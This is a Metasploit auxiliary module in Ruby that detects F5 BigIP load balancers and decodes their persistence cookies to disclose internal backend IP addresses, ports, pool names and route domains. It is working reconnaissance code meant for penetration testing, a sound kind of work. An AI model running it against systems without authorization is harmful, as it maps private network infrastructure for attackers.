##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP Backend Cookie Disclosure',
      'Description'    => %q{
        This module identifies F5 BigIP load balancers and leaks backend
        information (pool name, backend's IP address and port, routed domain)
        through cookies inserted by the BigIP system.
      },
      'Author'         =>
        [
          'Thanat0s <thanspam[at]trollprod.org>',
          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
          'Nikita Oleksov <neoleksov[at]gmail.com>',
          'Denis Kolegov <dnkolegov[at]gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html'],
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/7000/700/sol7784.html?sr=14607726']
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL'        => true
        }
    ))

    register_options(
      [
        OptInt.new('RPORT', [true, 'The BigIP service port to listen on', 443]),
        OptString.new('TARGETURI', [true, 'The URI path to test', '/']),
        OptInt.new('REQUESTS', [true, 'The number of requests to send', 10])
      ])
  end

  def change_endianness(value, size = 4)
    conversion = nil
    if size == 4
      conversion = [value].pack("V").unpack("N").first
    elsif size == 2
      conversion = [value].pack("v").unpack("n").first
    end
    conversion
  end

  def cookie_decode(cookie_value)
    backend = {}
    case
    when cookie_value =~ /(\d{8,10})\.(\d{1,5})\./
      host = Regexp.last_match(1).to_i
      port = Regexp.last_match(2).to_i
      host = change_endianness(host)
      host = Rex::Socket.addr_itoa(host)
      port = change_endianness(port, 2)
    when cookie_value.downcase =~ /rd\d+o0{20}f{4}([a-f0-9]{8})o(\d{1,5})/
      host = Regexp.last_match(1).to_i(16)
      port = Regexp.last_match(2).to_i
      host = Rex::Socket.addr_itoa(host)
    when cookie_value.downcase =~ /vi([a-f0-9]{32})\.(\d{1,5})/
      host = Regexp.last_match(1).to_i(16)
      port = Regexp.last_match(2).to_i
      host = Rex::Socket.addr_itoa(host, true)
      port = change_endianness(port, 2)
    when cookie_value.downcase =~ /rd\d+o([a-f0-9]{32})o(\d{1,5})/
      host = Regexp.last_match(1).to_i(16)
      port = Regexp.last_match(2).to_i
      host = Rex::Socket.addr_itoa(host, true)
    else
      host = nil
      port = nil
    end

    backend[:host] = host.nil? ? nil : host
    backend[:port] = port.nil? ? nil : port
    backend
  end

  def get_cookie # request a page and extract a F5 looking cookie.
    cookie = {}
    res = send_request_raw({ 'method' => 'GET', 'uri' => @uri })

    unless res.nil?
      # Get the SLB session IDs for all cases:
      # 1. IPv4 pool members - "BIGipServerWEB=2263487148.3013.0000",
      # 2. IPv4 pool members in non-default routed domains - "BIGipServerWEB=rd5o00000000000000000000ffffc0000201o80",
      # 3. IPv6 pool members - "BIGipServerWEB=vi20010112000000000000000000000030.20480",
      # 4. IPv6 pool members in non-default route domains - "BIGipServerWEB=rd3o20010112000000000000000000000030o80"

      regexp = /
        ([~_\.\-\w\d]+)=(((?:\d+\.){2}\d+)|
        (rd\d+o0{20}f{4}\w+o\d{1,5})|
        (vi([a-f0-9]{32})\.(\d{1,5}))|
        (rd\d+o([a-f0-9]{32})o(\d{1,5})))
        (?:$|,|;|\s)
      /x
      m = res.get_cookies.match(regexp)
      cookie[:id] = (m.nil?) ? nil : m[1]
      cookie[:value] = (m.nil?) ? nil : m[2]
    end
    cookie
  end

  def run
    requests = datastore['REQUESTS']
    backends = []
    @uri = normalize_uri(target_uri.path.to_s)
    print_status("Starting request #{@uri}")

    (1..requests).each do |i|
      cookie = get_cookie # Get the cookie
      # If the cookie is not found, stop process
      if cookie.empty? || cookie[:id].nil?
        print_error("F5 BigIP load balancing cookie not found")
        return
      end

      # Print the cookie name on the first request
      if i == 1
        print_good("F5 BigIP load balancing cookie \"#{cookie[:id]} = #{cookie[:value]}\" found")
        if cookie[:id].start_with?('BIGipServer')
          print_good("Load balancing pool name \"#{cookie[:id].split('BIGipServer')[1]}\" found")
        end
        if cookie[:value].start_with?('rd')
          print_good("Route domain \"#{cookie[:value].split('rd')[1].split('o')[0]}\" found")
        end
      end

      backend = cookie_decode(cookie[:value])
      unless backend[:host].nil? || backends.include?(backend)
        print_good("Backend #{backend[:host]}:#{backend[:port]} found")
        backends.push(backend)
      end
    end

    # Reporting found backends in database
    unless backends.empty?
      report_note(host: rhost, type: 'f5_load_balancer_backends', data: backends)
    end

    rescue ::Rex::ConnectionRefused
      print_error("Network connection error")
    rescue ::Rex::ConnectionError
      print_error("Network connection error")
    rescue ::OpenSSL::SSL::SSLError
      print_error("SSL/TLS connection error")
  end
end
